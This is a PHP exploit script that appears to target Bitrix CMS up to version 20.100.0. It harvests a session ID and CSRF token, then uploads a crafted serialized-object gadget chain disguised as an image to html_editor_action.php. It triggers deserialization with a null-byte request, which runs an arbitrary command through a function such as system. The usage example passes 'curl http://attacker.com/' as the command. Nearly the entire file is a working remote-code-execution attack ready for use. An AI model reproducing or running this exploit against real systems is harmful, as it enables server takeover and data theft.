<?php
# <= 20.100.0 [ Start <= Business | CRM (any user) ]

(!isset($argv[3]) ? exit(message('php '.basename(__FILE__).' "https://target-bitrix.com" "system" "curl http://attacker.com/"')) : @list($x, $url, $func, $farg) = $argv);

# get phpsess + csrf
if(!preg_match('#(PHPSESSID=.+;).+\'bitrix_sessid\':\'(.+)\'#Uis', request($url.'/bitrix/tools/composite_data.php'), $matches)) exit(message('composite_data problems')); else message($matches[1].', sessid='.$matches[2]);

# upload default
$body = implode("\r\n", [
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files[.][files][code]"',
	'',
	'default',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files[.][default]"; filename="image.jpg"',
	'Content-Type: image/jpeg',
	'',
	payload($func, $farg),
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[CID]"',
	'',
	'1',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[packageIndex]"',
	'',
	'pIndex101',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[mode]"',
	'',
	'upload',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="action"',
	'',
	'uploadfile',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="sessid"',
	'',
	$matches[2],
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[filesCount]"',
	'',
	'1',
	'-----------------------------xxxxxxxxxxxx--'
]);

request($url.'/bitrix/tools/html_editor_action.php', $matches[1], $body, 'Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx');

# exec default
message(request($url.'/bitrix/tools/html_editor_action.php', $matches[1], 'bxu_info[packageIndex]=pIndex101&action=uploadfile&bxu_info[mode]=upload&sessid='.$matches[2].'&bxu_info[filesCount]=1&bxu_info[CID]=default%00'));


function request($url, $cookie = '', $post = '', $header = []){
	$header = array_merge([($cookie ? 'Cookie: '.$cookie : '')], (is_string($header) ? [$header] : $header));

	$body = @file_get_contents($url, false, stream_context_create(
								['ssl' => [
											'verify_peer' => false,
											'verify_peer_name' => false,
								],
								'http' =>
								['method' => ($post ? 'POST' : 'GET'),
								'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
								'header' => implode("\r\n", $header),
								'content' => ($post ? $post : '')
                                ]
                             ])
           );
           
	$header = implode(PHP_EOL, $http_response_header);
     
	return $header.PHP_EOL.PHP_EOL.$body;
}

function payload($func, $farg){
	
	return 'O:27:"Bitrix\Main\ORM\Data\Result":3:{S:12:"\00*\00isSuccess";b:0;S:20:"\00*\00wereErrorsChecked";b:0;S:9:"\00*\00errors";O:27:"Bitrix\Main\Type\Dictionary":1:{S:9:"\00*\00values";a:1:{i:0;O:17:"Bitrix\Main\Error":1:{S:10:"\00*\00message";O:36:"Bitrix\Main\UI\Viewer\ItemAttributes":1:{S:13:"\00*\00attributes";O:29:"Bitrix\Main\DB\ResultIterator":3:{S:38:"\00Bitrix\5CMain\5CDB\5CResultIterator\00counter";i:0;S:42:"\00Bitrix\5CMain\5CDB\5CResultIterator\00currentData";i:0;S:37:"\00Bitrix\5CMain\5CDB\5CResultIterator\00result";O:26:"Bitrix\Main\DB\ArrayResult":2:{S:11:"\00*\00resource";a:1:{i:0;a:2:{i:0;S:'.strlen($farg).':"\\'.implode('\\', str_split(bin2hex($farg), 2)).'";i:1;s:1:"x";}}S:13:"\00*\00converters";a:2:{i:0;S:'.strlen($func).':"\\'.implode('\\', str_split(bin2hex($func), 2)).'";i:1;s:17:"WriteFinalMessage";}}}}}}}}';

}

function message($str){
	print PHP_EOL.'### '.$str.' ###'.PHP_EOL.PHP_EOL;
}
?>
